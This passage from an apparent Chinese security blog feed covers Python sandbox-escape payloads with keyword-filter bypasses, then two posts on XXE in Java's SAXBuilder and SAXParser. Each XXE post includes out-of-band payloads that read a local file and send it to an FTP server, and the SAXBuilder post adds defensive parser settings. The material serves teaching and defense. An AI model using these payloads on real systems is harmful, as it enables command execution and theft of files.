class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="过滤-globals"><a href="#过滤-globals" class="headerlink" title="过滤__globals__"></a>过滤__globals__</h3><p>当__globals__被禁用时，</p><ul><li>可以用func_globals直接替换；</li><li>使用__getattribute__(‘__globa’+’ls__‘)；</li></ul><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原型是调用__globals__</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果过滤了__globals__，可直接替换为func_globals</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="comment"># 也可以通过拼接字符串得到方式绕过</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">"__glo"</span>+<span class="string">"bals__"</span>)[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><h3 id="过滤-mro-或-bases-或-base"><a href="#过滤-mro-或-bases-或-base" class="headerlink" title="过滤__mro__或__bases__或__base__"></a>过滤__mro__或__bases__或__base__</h3><p>两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 三者互换均可</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>对关键字进行base64编码可绕过一些明文检测机制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'__import__'</span>)</span><br><span class="line"><span class="string">'X19pbXBvcnRfXw=='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'os'</span>)</span><br><span class="line"><span class="string">'b3M='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'calc'</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="reload-方法"><a href="#reload-方法" class="headerlink" title="reload()方法"></a>reload()方法</h3><p>某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">'eval'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><p>凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</p><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__bu'</span>+<span class="string">'iltins__'</span>][<span class="string">'__impor'</span>+<span class="string">'t__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'ca'</span>+<span class="string">'lc'</span>)</span><br></pre></td></tr></table></figure><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>当中括号[]被过滤掉时，</p><ul><li>调用__getitem__()函数直接替换；</li><li>调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</li></ul><p>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原型</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__()替换中括号[]</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()替换中括号[]，结合__getitem__()利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.pop(<span class="string">'__builtins__'</span>).pop(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/" target="_blank" rel="noopener">Python 沙箱逃逸</a></p><p><a href="https://98587329.github.io/2018/06/06/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python 沙箱逃逸</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://Mi1k7ea.github.com/tags/Python/"/>
    
      <category term="沙箱逃逸" scheme="https://Mi1k7ea.github.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>XML注入之SAXBuilder</title>
    <link href="https://Mi1k7ea.github.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXBuilder/"/>
    <id>https://Mi1k7ea.github.com/2019/05/26/XML注入之SAXBuilder/</id>
    <published>2019-05-26T10:46:26.000Z</published>
    <updated>2019-05-28T14:15:50.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-何为SAXBuilder"><a href="#0x01-何为SAXBuilder" class="headerlink" title="0x01 何为SAXBuilder"></a>0x01 何为SAXBuilder</h2><p>SAXBuilder是一个JDOM解析器，能将路径中的XML文件解析为Document对象。</p><p>SAXBuilder使用第三方SAX解析器（默认情况下由JAXP选择，或者您可以手动配置）来处理解析任务，并使用SAXHandler的实例来侦听SAX事件，以便使用JDOM内容构造文档一个JDOMFactory。</p><h2 id="0x02-常规用法Demo"><a href="#0x02-常规用法Demo" class="headerlink" title="0x02 常规用法Demo"></a>0x02 常规用法Demo</h2><p>需要下载org.jdom的jar包：<a href="http://www.jdom.org/dist/binary/jdom-2.0.6.zip" target="_blank" rel="noopener">http://www.jdom.org/dist/binary/jdom-2.0.6.zip</a></p><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Demo代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        saxBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXBuilder saxBuilder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            org.jdom2.Document d = saxBuilder.build(f);</span><br><span class="line">            Element root = d.getRootElement();</span><br><span class="line">            List&lt;Element&gt; childs = root.getChildren();</span><br><span class="line">            <span class="keyword">for</span> (Element child : childs)&#123;</span><br><span class="line">                String name = child.getName();</span><br><span class="line">                String text = child.getText();</span><br><span class="line">                System.out.println(name + <span class="string">":"</span> + text);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，发现成功解析了user.xml的内容：</p><p><img src="/2019/05/26/XML注入之SAXBuilder/1.png" alt=""></p><h2 id="0x03-XML注入漏洞验证"><a href="#0x03-XML注入漏洞验证" class="headerlink" title="0x03 XML注入漏洞验证"></a>0x03 XML注入漏洞验证</h2><p>具体的步骤参考之前的博客<a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/" target="_blank" rel="noopener">《XML注入之DocumentBuilder与XXE攻击防御》</a>，这里不再赘述。</p><p>下面只进行无回显外带OOB攻击Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        saxBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXBuilder saxBuilder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            org.jdom2.Document d = saxBuilder.build(f);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ftp.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">        &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt;</span><br><span class="line">        %remote;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>ftp.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>运行本地FTPServer接收数据：</p><p><img src="/2019/05/26/XML注入之SAXBuilder/2.png" alt=""></p><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 检测方法</h2><p>1、在Java项目中搜索org.jdom下的SAXBuilder，排查是否使用了该API解析XML文档内容；</p><p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能；</p><p>3、除了setFeature()的设置外，检查Reader在read()解析xml数据之前是否采用setEntityResolver()的方式来设置自定义实体解析方式；</p><h2 id="0x05-防御方法"><a href="#0x05-防御方法" class="headerlink" title="0x05 防御方法"></a>0x05 防御方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxBuilder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
      <category term="XML注入" scheme="https://Mi1k7ea.github.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XML注入之SAXParser</title>
    <link href="https://Mi1k7ea.github.com/2019/05/26/XML%E6%B3%A8%E5%85%A5%E4%B9%8BSAXParser/"/>
    <id>https://Mi1k7ea.github.com/2019/05/26/XML注入之SAXParser/</id>
    <published>2019-05-26T02:09:06.000Z</published>
    <updated>2019-05-28T14:16:07.493Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-何为SAXParser"><a href="#0x01-何为SAXParser" class="headerlink" title="0x01 何为SAXParser"></a>0x01 何为SAXParser</h2><p>Java中javax.xml.parsers下的常用的解析XML格式内容的类。</p><h2 id="0x02-常规用法Demo"><a href="#0x02-常规用法Demo" class="headerlink" title="0x02 常规用法Demo"></a>0x02 常规用法Demo</h2><p>先定义一个user.xml，用于让DocumentBuilder来解析：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Demo代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        saxParser(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxParser</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = saxParserFactory.newSAXParser();</span><br><span class="line">            MyDefaultHandler defaultHandler = <span class="keyword">new</span> MyDefaultHandler();</span><br><span class="line">            saxParser.parse(f, defaultHandler);</span><br><span class="line">            <span class="keyword">char</span>[] c = &#123;&#125;;</span><br><span class="line">            defaultHandler.characters(c, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里输出的话需要自己来写下解析代码，这里示例是继承DefaultHandler类重写characters()方法即可输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDefaultHandler</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span> <span class="params">(<span class="keyword">char</span> ch[], <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> SAXException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，发现成功解析了user.xml的内容，但是有瑕疵，输出多次了：</p><p><img src="/2019/05/26/XML注入之SAXParser/1.png" alt=""></p><h2 id="0x03-XML注入漏洞验证"><a href="#0x03-XML注入漏洞验证" class="headerlink" title="0x03 XML注入漏洞验证"></a>0x03 XML注入漏洞验证</h2><p>具体的步骤参考之前的博客<a href="https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/" target="_blank" rel="noopener">《XML注入之DocumentBuilder与XXE攻击防御》</a>，这里不再赘述。</p><p>下面只进行无回显外带OOB攻击Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"ftp.xml"</span>);</span><br><span class="line">        saxParser(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saxParser</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = saxParserFactory.newSAXParser();</span><br><span class="line">            MyDefaultHandler defaultHandler = <span class="keyword">new</span> MyDefaultHandler();</span><br><span class="line">            saxParser.parse(f, defaultHandler);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ftp.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">        &lt;!ENTITY % file SYSTEM &quot;file:///e:/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/ftp.dtd&quot;&gt;</span><br><span class="line">        %remote;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>ftp.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>运行本地FTPServer接收数据：</p><p><img src="/2019/05/26/XML注入之SAXParser/2.png" alt=""></p><h2 id="0x04-检测方法"><a href="#0x04-检测方法" class="headerlink" title="0x04 检测方法"></a>0x04 